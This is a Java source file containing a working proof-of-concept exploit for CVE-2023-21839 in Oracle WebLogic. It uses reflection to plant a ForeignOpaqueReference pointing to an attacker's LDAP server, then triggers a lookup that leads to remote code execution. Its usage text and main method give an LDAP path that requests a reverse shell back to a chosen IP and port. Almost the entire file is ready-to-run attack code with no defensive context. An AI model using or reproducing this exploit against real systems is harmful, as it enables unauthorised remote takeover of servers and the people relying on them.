import javax.naming.Context;
import javax.naming.InitialContext;
import javax.naming.NamingException;
import java.lang.reflect.Field;
import java.util.Hashtable;
import java.util.Random;

public class CVE_2023_21839 {
    static String JNDI_FACTORY="weblogic.jndi.WLInitialContextFactory";
    static String HOW_TO_USE="[*]目标ip:端口 ldap地址\ne.g. 192.168.1.1:7001 192.168.1.2:1389/Basic/ReverseShell/192.168.1.2/1111";

    private static InitialContext getInitialContext(String url)throws NamingException
    {
        Hashtable<String,String> env = new Hashtable<String,String>();
        env.put(Context.INITIAL_CONTEXT_FACTORY, JNDI_FACTORY);
        env.put(Context.PROVIDER_URL, url);
        return new InitialContext(env);
    }
    public static void poc(String t3Url, String ldapUrl) {
        /*if(args.length <2){
            System.out.println(HOW_TO_USE);
            System.exit(0);
        }*/
        //String t3Url = args[0];
        //String ldapUrl = args[1];
        try {
            if(t3Url == null || t3Url.isEmpty() || ldapUrl == null || ldapUrl.isEmpty()){
                System.out.println(HOW_TO_USE);
                //System.exit(0);
                }
            InitialContext c = getInitialContext("t3://" + t3Url);   //目标url
            Hashtable<String, String> env = new Hashtable<String, String>();
            env.put(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.rmi.registry.RegistryContextFactory");
            env.put("com.sun.jndi.ldap.connect.timeout", "3000"); // 设置超时时间为5秒

            weblogic.deployment.jms.ForeignOpaqueReference f = new weblogic.deployment.jms.ForeignOpaqueReference();
            Field jndiEnvironment = weblogic.deployment.jms.ForeignOpaqueReference.class.getDeclaredField("jndiEnvironment");
            jndiEnvironment.setAccessible(true);
            jndiEnvironment.set(f, env);
            Field remoteJNDIName = weblogic.deployment.jms.ForeignOpaqueReference.class.getDeclaredField("remoteJNDIName");
            remoteJNDIName.setAccessible(true);
            ldapUrl = "ldap://"+ldapUrl;  //test
            remoteJNDIName.set(f, ldapUrl);
            String bindName = new Random(System.currentTimeMillis()).nextLong()+"";
            try{
                c.bind(bindName,f);
                //System.out.println("\n test");
                c.lookup(bindName);
            }catch(Exception e){ }
        }catch(Exception e){
            //return"请查看ldap服务器检查返回:\n"+e.toString();
        }
    }
    public static void main(String args[]) throws Exception {
        poc("192.168.1.1:7001","1192.168.1.1:1389/Basic/ReverseShell/192.168.1.1/5003");  //test
    }
}